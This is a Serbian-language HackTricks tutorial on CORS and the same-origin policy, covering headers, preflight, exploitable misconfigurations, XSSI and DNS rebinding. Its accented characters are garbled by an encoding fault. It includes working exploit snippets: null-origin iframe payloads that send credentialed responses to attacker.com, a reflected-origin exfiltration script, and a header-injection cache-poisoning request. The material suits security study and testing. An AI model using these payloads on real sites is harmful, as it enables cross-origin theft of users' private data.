# CORS - Konfiguracije i Obila쬰nje

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## 맚a je CORS?

Cross-Origin Resource Sharing (CORS) standard **omogu캖ava serverima da defini코u ko mo쬰 da pristupi njihovim resursima** i **koje HTTP metode zahteva su dozvoljene** iz spolja코njih izvora.

**Politika istog porekla** nala쬰 da **server koji zahteva** resurs i server koji hostuje **resurs** dele isti protokol (npr., `http://`), naziv domena (npr., `internal-web.com`), i **port** (npr., 80). Prema ovoj politici, samo web stranice sa istog domena i porta imaju dozvolu za pristup resursima.

Primena politike istog porekla u kontekstu `http://normal-website.com/example/example.html` ilustrovana je na slede캖i na캜in:

| URL pristupljen                              | Da li je pristup dozvoljen?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Da: Identi캜an shema, domen i port |
| `http://normal-website.com/example2/`     | Da: Identi캜an shema, domen i port |
| `https://normal-website.com/example/`     | Ne: Druga캜ija shema i port           |
| `http://en.normal-website.com/example/`   | Ne: Druga캜iji domen                    |
| `http://www.normal-website.com/example/`  | Ne: Druga캜iji domen                    |
| `http://normal-website.com:8080/example/` | Ne: Drugi port\*                    |

\*Internet Explorer zanemaruje broj porta prilikom primene politike istog porekla, 캜ime omogu캖ava ovaj pristup.

### `Access-Control-Allow-Origin` Header

Ovaj header mo쬰 dozvoliti **vi코e porekla**, **`null`** vrednost, ili wildcard **`*`**. Me캠utim, **nijedan pretra쬴va캜 ne podr쬬va vi코e porekla**, a kori코캖enje wildcard `*` podlo쬹o je **ograni캜enjima**. (Wildcard mora biti kori코캖en samostalno, a njegovo kori코캖enje zajedno sa `Access-Control-Allow-Credentials: true` nije dozvoljeno.)

Ovaj header je **izdat od strane servera** kao odgovor na zahtev za resursom iz drugog domena koji je pokrenut od strane web stranice, pri 캜emu pretra쬴va캜 automatski dodaje `Origin` header.

### `Access-Control-Allow-Credentials` Header

Po **default-u**, zahtevi iz drugog porekla se 코alju bez kredencijala kao 코to su kola캜i캖i ili Authorization header. Ipak, server iz drugog domena mo쬰 dozvoliti 캜itanje odgovora kada su kredencijali poslati postavljanjem `Access-Control-Allow-Credentials` header-a na **`true`**.

Ako je postavljen na `true`, pretra쬴va캜 캖e preneti kredencijale (kola캜i캖e, autorizacione heder-e, ili TLS klijentske sertifikate).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Pre-flight request

### Razumevanje Pre-flight zahteva u komunikaciji izme캠u domena

Kada se pokre캖e zahtev izme캠u domena pod specifi캜nim uslovima, kao 코to su kori코캖enje **ne-standardne HTTP metode** (bilo 코ta osim HEAD, GET, POST), uvo캠enje novih **zaglavlja**, ili kori코캖enje posebne **vrednosti zaglavlja Content-Type**, mo쬰 biti potreban pre-flight zahtev. Ovaj preliminarni zahtev, koji koristi **`OPTIONS`** metodu, slu쬴 da obavesti server o namerama nadolaze캖eg cross-origin zahteva, uklju캜uju캖i HTTP metode i zaglavlja koja namerava da koristi.

Protokol **Cross-Origin Resource Sharing (CORS)** zahteva ovu pre-flight proveru kako bi se utvrdila izvodljivost tra쬰ne cross-origin operacije verifikovanjem dozvoljenih metoda, zaglavlja i pouzdanosti porekla. Za detaljno razumevanje uslova koji zaobilaze potrebu za pre-flight zahtevom, pogledajte sveobuhvatan vodi캜 koji pru쬬 [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests).

Va쬹o je napomenuti da **odsustvo pre-flight zahteva ne ukida obavezu da odgovor nosi autorizacijska zaglavlja**. Bez ovih zaglavlja, pregleda캜 je onemogu캖en u svojoj sposobnosti da obradi odgovor iz cross-origin zahteva.

Razmotrite slede캖u ilustraciju pre-flight zahteva koji ima za cilj kori코캖enje `PUT` metode zajedno sa prilago캠enim zaglavljem pod nazivom `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
U odgovoru, server mo쬰 vratiti zaglavlja koja ukazuju na prihva캖ene metode, dozvoljeni izvor i druge detalje CORS politike, kao 코to je prikazano u nastavku:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Ova zaglavlja specificira koja zaglavlja mogu biti kori코캖ena tokom stvarnog zahteva. Postavlja ga server da ozna캜i dozvoljena zaglavlja u zahtevima od klijenta.
* **`Access-Control-Expose-Headers`**: Kroz ovo zaglavlje, server obave코tava klijenta o tome koja zaglavlja mogu biti izlo쬰na kao deo odgovora pored jednostavnih zaglavlja odgovora.
* **`Access-Control-Max-Age`**: Ova zaglavlja ozna캜ava koliko dugo rezultati pre-flight zahteva mogu biti ke코irani. Server postavlja maksimalno vreme, u sekundama, koje se informacije vra캖ene pre-flight zahtevom mogu ponovo koristiti.
* **`Access-Control-Request-Headers`**: Koristi se u pre-flight zahtevima, ovo zaglavlje postavlja klijent da obavesti server o tome koja HTTP zaglavlja klijent 쬰li da koristi u stvarnom zahtevu.
* **`Access-Control-Request-Method`**: Ova zaglavlja, tako캠e kori코캖ena u pre-flight zahtevima, postavlja klijent da ozna캜i koji HTTP metod 캖e biti kori코캖en u stvarnom zahtevu.
* **`Origin`**: Ova zaglavlja automatski postavlja pregleda캜 i ozna캜ava poreklo cross-origin zahteva. Koristi ga server da proceni da li bi dolazni zahtev trebao biti dozvoljen ili odbijen na osnovu CORS politike.

Napomena da obi캜no (u zavisnosti od tipa sadr쬬ja i postavljenih zaglavlja) u **GET/POST zahtevu ne 코alje se pre-flight zahtev** (zahtev se 코alje **direktno**), ali ako 쬰lite da pristupite **zaglavljima/telu odgovora**, mora sadr쬬ti _Access-Control-Allow-Origin_ zaglavlje koje to dozvoljava.\
**Stoga, CORS ne 코titi od CSRF (ali mo쬰 biti od pomo캖i).**

### **Zahtevi za lokalnu mre쬿 Pre-flight zahtev**

1. **`Access-Control-Request-Local-Network`**: Ova zaglavlja se uklju캜uje u zahtev klijenta da ozna캜i da je upit usmeren na resurs lokalne mre쬰. Slu쬴 kao oznaka da obavesti server da zahtev poti캜e iz lokalne mre쬰.
2. **`Access-Control-Allow-Local-Network`**: U odgovoru, serveri koriste ovo zaglavlje da komuniciraju da je tra쬰ni resurs dozvoljeno deliti sa entitetima van lokalne mre쬰. Deluje kao zeleno svetlo za deljenje resursa preko razli캜itih mre쬹ih granica, osiguravaju캖i kontrolisan pristup uz odr쬬vanje sigurnosnih protokola.

**Validan odgovor koji dozvoljava zahtev lokalne mre쬰** tako캠e treba da ima u odgovoru zaglavlje `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Napomena da linux **0.0.0.0** IP radi za **bypass** ovih zahteva za pristup localhost-u, jer se ta IP adresa ne smatra "lokalnom".

Tako캠e je mogu캖e **bypass-ovati zahteve za lokalnu mre쬿** ako koristite **javnu IP adresu lokalnog krajnjeg ta캜ke** (kao 코to je javna IP adresa rutera). Jer u nekoliko slu캜ajeva, 캜ak i ako se pristupa **javnoj IP**, ako je **iz lokalne mre쬰**, pristup 캖e biti odobren.
{% endhint %}

## Iskoristive pogre코ne konfiguracije

Prime캖eno je da je postavljanje `Access-Control-Allow-Credentials` na **`true`** preduslov za ve캖inu **pravih napada**. Ova postavka omogu캖ava pretra쬴va캜u da 코alje akreditive i 캜ita odgovor, pove캖avaju캖i efikasnost napada. Bez toga, korist od slanja zahteva putem pretra쬴va캜a umesto li캜no opada, jer kori코캖enje korisnikovih kola캜i캖a postaje neizvodljivo.

### Izuzetak: Iskori코캖avanje Mre쬹e Lokacije kao Autentifikacije

Postoji izuzetak gde mre쬹a lokacija rtve deluje kao oblik autentifikacije. Ovo omogu캖ava kori코캖enje pretra쬴va캜a rtve kao proxy, zaobila쬰nje autentifikacije zasnovane na IP-u za pristup intranet aplikacijama. Ova metoda deli sli캜nosti u uticaju sa DNS rebinding-om, ali je jednostavnija za iskori코캖avanje.

### Odsijavanje `Origin` u `Access-Control-Allow-Origin`

Scenarij iz stvarnog sveta gde se vrednost `Origin` zaglavlja odra쬬va u `Access-Control-Allow-Origin` je teoretski malo verovatan zbog ograni캜enja u kombinovanju ovih zaglavlja. Me캠utim, programeri koji 쬰le da omogu캖e CORS za vi코e URL-ova mogu dinami캜ki generisati `Access-Control-Allow-Origin` zaglavlje kopiraju캖i vrednost `Origin` zaglavlja. Ovaj pristup mo쬰 uvesti ranjivosti, posebno kada napada캜 koristi domen sa imenom koje deluje legitimno, obmanjuju캖i logiku validacije.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Iskori코캖avanje `null` porekla

`null` poreklo, odre캠eno za situacije kao 코to su preusmeravanja ili lokalne HTML datoteke, ima jedinstvenu poziciju. Neke aplikacije stavljaju ovo poreklo na belu listu kako bi olak코ale lokalni razvoj, nenamerno omogu캖avaju캖i bilo kojoj veb stranici da imitira `null` poreklo putem sandbox-ovanog iframe-a, 캜ime se zaobilaze CORS ograni캜enja.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Tehnike za zaobila쬰nje regularnih izraza

Kada se susretnete sa belom listom domena, klju캜no je testirati mogu캖nosti za zaobila쬰nje, kao 코to je dodavanje domena napada캜a na belu listu ili iskori코캖avanje ranjivosti preuzimanja poddomena. Pored toga, regularni izrazi kori코캖eni za validaciju domena mogu zanemariti nijanse u konvencijama imenovanja domena, 코to predstavlja dodatne mogu캖nosti za zaobila쬰nje.

### Napredna zaobila쬰nja regularnih izraza

Regex obrasci obi캜no se fokusiraju na alfanumeri캜ke, ta캜ku (.) i crticu (-), zanemaruju캖i druge mogu캖nosti. Na primer, naziv domena napravljen da uklju캜uje karaktere koje pregleda캜i i regex obrasci tuma캜e druga캜ije mo쬰 zaobi캖i bezbednosne provere. Kako Safari, Chrome i Firefox obra캠uju karaktere donje crte u poddomenima ilustruje kako se takve razlike mogu iskoristiti za zaobila쬰nje logike validacije domena.

**Za vi코e informacija i pode코avanja ove provere zaobila쬰nja:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **i** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (284).png>)

### Iz XSS unutar poddomena

Programeri 캜esto implementiraju odbrambene mehanizme kako bi se za코titili od CORS eksploatacije beljenjem domena koji su dozvoljeni da tra쬰 informacije. I pored ovih mera opreza, bezbednost sistema nije nepogre코iva. Prisutnost 캜ak i jednog ranjivog poddomena unutar belih listi domena mo쬰 otvoriti vrata CORS eksploataciji kroz druge ranjivosti, kao 코to je XSS (Cross-Site Scripting).

Da ilustrujemo, razmotrite scenario u kojem je domen, `requester.com`, stavljen na belu listu da pristupa resursima sa drugog domena, `provider.com`. Konfiguracija na serverskoj strani mo쬰 izgledati ovako:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
U ovoj postavci, svi poddomeni `requester.com` imaju dozvoljen pristup. Me캠utim, ako je poddomen, recimo `sub.requester.com`, kompromitovan XSS ranjivo코캖u, napada캜 mo쬰 iskoristiti ovu slabost. Na primer, napada캜 sa pristupom `sub.requester.com` mogao bi iskoristiti XSS ranjivost da zaobi캠e CORS politike i zlonamerno pristupi resursima na `provider.com`.

### **Trovanje ke코a na serverskoj strani**

[**Iz ove studije**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Mogu캖e je da se iskori코캖avanjem trovanja ke코a na serverskoj strani putem injekcije HTTP header-a mo쬰 izazvati pohranjena Cross-Site Scripting (XSS) ranjivost. Ovaj scenario se odvija kada aplikacija ne uspe da sanitizuje `Origin` header od nelegalnih karaktera, stvaraju캖i ranjivost posebno za korisnike Internet Explorer-a i Edge-a. Ovi pregleda캜i tretiraju (0x0d) kao legitimni terminator HTTP header-a, 코to dovodi do ranjivosti injekcije HTTP header-a.

Razmotrite slede캖i zahtev gde je `Origin` header manipulisan:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer i Edge interpretiraju odgovor kao:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Dok direktno iskori코캖avanje ove ranjivosti slanjem neispravnog zaglavlja putem web pretra쬴va캜a nije izvodljivo, mo쬰 se ru캜no generisati prilago캠eni zahtev koriste캖i alate poput Burp Suite. Ova metoda mo쬰 dovesti do toga da server-side ke코 sa캜uva odgovor i nenamerno ga poslu쬿je drugima. Prilago캠eni payload ima za cilj da izmeni karakter set stranice na UTF-7, kodiranje karaktera koje se 캜esto povezuje sa XSS ranjivostima zbog svoje sposobnosti da kodira karaktere na na캜in koji mo쬰 biti izvr코en kao skripta u odre캠enim kontekstima.

Za dalju literaturu o pohranjenim XSS ranjivostima, pogledajte [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Napomena**: Iskori코캖avanje ranjivosti injekcije HTTP zaglavlja, posebno kroz trovanje server-side ke코a, nagla코ava kriti캜nu va쬹ost validacije i sanitizacije svih korisni캜kih unosa, uklju캜uju캖i HTTP zaglavlja. Uvek primenjujte robusni sigurnosni model koji uklju캜uje validaciju unosa kako biste spre캜ili takve ranjivosti.

### **Trovanje ke코a na klijentskoj strani**

[**Iz ovog istra쬴vanja**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

U ovom scenariju, prime캖ena je instanca web stranice koja reflektuje sadr쬬j prilago캠enog HTTP zaglavlja bez pravilnog kodiranja. Konkretno, web stranica vra캖a sadr쬬j uklju캜en u `X-User-id` zaglavlje, koje mo쬰 uklju캜ivati zlonamerni JavaScript, kao 코to je prikazano u primeru gde zaglavlje sadr쬴 SVG tag za sliku dizajniran da izvr코i JavaScript kod prilikom u캜itavanja.

Cross-Origin Resource Sharing (CORS) politike omogu캖avaju slanje prilago캠enih zaglavlja. Me캠utim, bez toga da odgovor bude direktno prikazan od strane pretra쬴va캜a zbog CORS ograni캜enja, korisnost takve injekcije mo쬰 delovati ograni캜eno. Kriti캜na ta캜ka se javlja kada se razmatra pona코anje ke코a pretra쬴va캜a. Ako `Vary: Origin` zaglavlje nije specificirano, postaje mogu캖e da zlonamerni odgovor bude ke코iran od strane pretra쬴va캜a. Nakon toga, ovaj ke코irani odgovor mo쬰 biti direktno prikazan prilikom navigacije na URL, zaobilaze캖i potrebu za direktnim prikazivanjem prilikom inicijalnog zahteva. Ovaj mehanizam pobolj코ava pouzdanost napada kori코캖enjem ke코iranja na klijentskoj strani.

Da ilustruje ovaj napad, pru쬰n je JavaScript primer, dizajniran da se izvr코i u okru쬰nju web stranice, kao 코to je kroz JSFiddle. Ovaj skript izvr코ava jednostavnu radnju: 코alje zahtev na odre캠eni URL sa prilago캠enim zaglavljem koje sadr쬴 zlonamerni JavaScript. Nakon uspe코nog zavr코etka zahteva, poku코ava da se navigira na ciljani URL, potencijalno pokre캖u캖i izvr코enje injektovane skripte ako je odgovor ke코iran bez pravilnog rukovanja `Vary: Origin` zaglavljem.

Evo sa쬰tka JavaScript-a koji se koristi za izvr코enje ovog napada:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, poznat i kao Cross-Site Script Inclusion, je vrsta ranjivosti koja koristi 캜injenicu da se Pravilo iste porekla (SOP) ne primenjuje prilikom uklju캜ivanja resursa koriste캖i script tag. To je zato 코to skripte moraju mo캖i da se uklju캜uju sa razli캜itih domena. Ova ranjivost omogu캖ava napada캜u da pristupi i pro캜ita bilo koji sadr쬬j koji je uklju캜en koriste캖i script tag.

Ova ranjivost postaje posebno zna캜ajna kada su u pitanju dinami캜ki JavaScript ili JSONP (JSON sa Padding), posebno kada se informacije o ambijentalnim ovla코캖enjima kao 코to su kola캜i캖i koriste za autentifikaciju. Kada se zahteva resurs sa drugog hosta, kola캜i캖i se uklju캜uju, 캜ine캖i ih dostupnim napada캜u.

Da biste bolje razumeli i ubla쬴li ovu ranjivost, mo쬰te koristiti BurpSuite dodatak dostupan na [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Ovaj dodatak mo쬰 pomo캖i u identifikaciji i re코avanju potencijalnih XSSI ranjivosti u va코im web aplikacijama.

[**Pro캜itajte vi코e o razli캜itim vrstama XSSI i kako ih iskoristiti ovde.**](xssi-cross-site-script-inclusion.md)

Poku코ajte da dodate **`callback`** **parametar** u zahtev. Mo쬯a je stranica pripremljena da po코alje podatke kao JSONP. U tom slu캜aju, stranica 캖e poslati nazad podatke sa `Content-Type: application/javascript`, 코to 캖e zaobi캖i CORS politiku.

![](<../.gitbook/assets/image (856).png>)

### Laka (beskorisna?) zaobila쬰nja

Jedan od na캜ina da se zaobi캠e ograni캜enje `Access-Control-Allow-Origin` je da se zatra쬴 od web aplikacije da napravi zahtev u va코e ime i po코alje nazad odgovor. Me캠utim, u ovom scenariju, akreditivi kona캜ne rtve ne캖e biti poslati jer se zahtev upu캖uje drugom domenu.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Ovaj alat pru쬬 proxy koji prosle캠uje va코 zahtev zajedno sa njegovim zaglavljima, dok tako캠e la쬴ra Origin zaglavlje da odgovara tra쬰nom domenu. Ovo efikasno zaobilazi CORS politiku. Evo primera kori코캖enja sa XMLHttpRequest:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Ovaj alat nudi alternativni pristup proxy-ju zahteva. Umesto da prosledi va코 zahtev onako kako jeste, server pravi svoj zahtev sa specificiranim parametrima.

### Iframe + Popup zaobila쬰nje

Mo쬰te **zaobi캖i CORS provere** kao 코to su `e.origin === window.origin` tako 코to 캖ete **napraviti iframe** i **iz njega otvoriti novi prozor**. Vi코e informacija na slede캖oj stranici:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding putem TTL

DNS rebinding putem TTL je tehnika koja se koristi za zaobila쬰nje odre캠enih bezbednosnih mera manipulacijom DNS zapisa. Evo kako to funkcioni코e:

1. Napada캜 kreira web stranicu i navodi rtvu da joj pristupi.
2. Napada캜 zatim menja DNS (IP) svog domena da ukazuje na web stranicu rtve.
3. Pregleda캜 rtve ke코ira DNS odgovor, koji mo쬰 imati TTL (Time to Live) vrednost koja ozna캜ava koliko dugo se DNS zapis treba smatrati va쬰캖im.
4. Kada TTL istekne, pregleda캜 rtve pravi novi DNS zahtev, omogu캖avaju캖i napada캜u da izvr코i JavaScript kod na stranici rtve.
5. Odr쬬vanjem kontrole nad IP adresom rtve, napada캜 mo쬰 prikupljati informacije od rtve bez slanja bilo kakvih kola캜i캖a na server rtve.

Va쬹o je napomenuti da pregleda캜i imaju mehanizme ke코iranja koji mogu spre캜iti trenutnu zloupotrebu ove tehnike, 캜ak i sa niskim TTL vrednostima.

DNS rebinding mo쬰 biti koristan za zaobila쬰nje eksplicitnih IP provera koje vr코i rtva ili za scenarije u kojima korisnik ili bot ostaje na istoj stranici du쬴 vremenski period, omogu캖avaju캖i ke코u da istekne.

Ako vam je potreban brz na캜in za zloupotrebu DNS rebinding-a, mo쬰te koristiti usluge kao 코to su [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Da biste pokrenuli svoj DNS rebinding server, mo쬰te koristiti alate kao 코to su **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). Ovo uklju캜uje izlaganje va코eg lokalnog porta 53/udp, kreiranje A zapisa koji ukazuje na njega (npr. ns.example.com), i kreiranje NS zapisa koji ukazuje na prethodno kreirani A poddomen (npr. ns.example.com). Bilo koji poddomen ns.example.com poddomena 캖e tada biti re코en od strane va코eg hosta.

Mo쬰te tako캠e istra쬴ti javno pokrenuti server na [http://rebind.it/singularity.html](http://rebind.it/singularity.html) za dalju razumevanje i eksperimentisanje.

### DNS Rebinding putem **DNS Cache Flooding**

DNS rebinding putem DNS cache flooding je jo코 jedna tehnika koja se koristi za zaobila쬰nje mehanizma ke코iranja pregleda캜a i prisiljavanje drugog DNS zahteva. Evo kako to funkcioni코e:

1. U po캜etku, kada rtva napravi DNS zahtev, odgovara se sa IP adresom napada캜a.
2. Da bi zaobi코ao mehanizam ke코iranja, napada캜 koristi servisnog radnika. Servisni radnik poplavljuje DNS ke코, 코to efikasno bri코e ke코irano ime servera napada캜a.
3. Kada pregleda캜 rtve napravi drugi DNS zahtev, sada se odgovara sa IP adresom 127.0.0.1, koja obi캜no se odnosi na localhost.

Poplavljuju캖i DNS ke코 sa servisnim radnikom, napada캜 mo쬰 manipulisati procesom DNS rezolucije i prisiliti pregleda캜 rtve da napravi drugi zahtev, ovaj put re코avaju캖i na IP adresu koju napada캜 쬰li.

### DNS Rebinding putem **Ke코a**

Jo코 jedan na캜in da se zaobi캠e mehanizam ke코iranja je kori코캖enjem vi코e IP adresa za isti poddomen kod DNS provajdera. Evo kako to funkcioni코e:

1. Napada캜 postavlja dva A zapisa (ili jedan A zapis sa dve IP adrese) za isti poddomen kod DNS provajdera.
2. Kada pregleda캜 proverava ove zapise, prima obe IP adrese.
3. Ako pregleda캜 odlu캜i da prvo koristi IP adresu napada캜a, napada캜 mo쬰 poslu쬴ti payload koji vr코i HTTP zahteve na istom domenu.
4. Me캠utim, kada napada캜 dobije IP adresu rtve, prestaje da odgovara pregleda캜u rtve.
5. Pregleda캜 rtve, shvativ코i da domen nije odgovoran, prelazi na kori코캖enje druge date IP adrese.
6. Pristupanjem drugoj IP adresi, pregleda캜 zaobilazi Pravilo iste porekla (SOP), omogu캖avaju캖i napada캜u da zloupotrebi ovo i prikupi i eksfiltrira informacije.

Ova tehnika koristi pona코anje pregleda캜a kada se za domen pru쬬ju vi코e IP adresa. Kontrolisanjem odgovora i manipulisanjem izbora IP adrese od strane pregleda캜a, napada캜 mo쬰 iskoristiti SOP i pristupiti informacijama od rtve.

{% hint style="warning" %}
Napomena da da biste pristupili localhost-u, trebate poku코ati da ponovo pove쬰te **127.0.0.1** u Windows-u i **0.0.0.0** u Linux-u.\
Provajderi kao 코to su godaddy ili cloudflare nisu mi dozvolili da koristim IP 0.0.0.0, ali AWS route53 mi je dozvolio da kreiram jedan A zapis sa 2 IP adrese, od kojih je jedna "0.0.0.0"

<img src="../.gitbook/assets/image (140).png" alt="" data-size="original">
{% endhint %}

Za vi코e informacija mo쬰te proveriti [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### Druge uobi캜ajene zaobila쬰nja

* Ako **interni IP-ovi nisu dozvoljeni**, mo쬯a su **zaboravili da zabrane 0.0.0.0** (radi na Linux-u i Mac-u)
* Ako **interni IP-ovi nisu dozvoljeni**, odgovarajte sa **CNAME** na **localhost** (radi na Linux-u i Mac-u)
* Ako **interni IP-ovi nisu dozvoljeni** kao DNS odgovori, mo쬰te odgovoriti sa **CNAME-ima na interne servise** kao 코to su www.corporate.internal.

### DNS Rebidding Weaponized

Mo쬰te prona캖i vi코e informacija o prethodnim tehnikama zaobila쬰nja i kako koristiti slede캖i alat u predavanju [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) je alat za izvo캠enje [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding) napada. Uklju캜uje potrebne komponente za ponovo povezivanje IP adrese DNS imena servera napada na IP adresu ciljne ma코ine i za poslu쬴vanje napada캜kih payload-a za iskori코캖avanje ranjivog softvera na ciljnoj ma코ini.

### Prava za코tita od DNS Rebinding

* Koristite TLS u internim servisima
* Zahtevajte autentifikaciju za pristup podacima
* Validirajte Host zaglavlje
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Predlog da se uvek 코alje pre-flight zahtev kada javni serveri 쬰le da pristupe internim serverima

## **Alati**

**Fuzz mogu캖e pogre코ne konfiguracije u CORS politikama**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## Reference

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
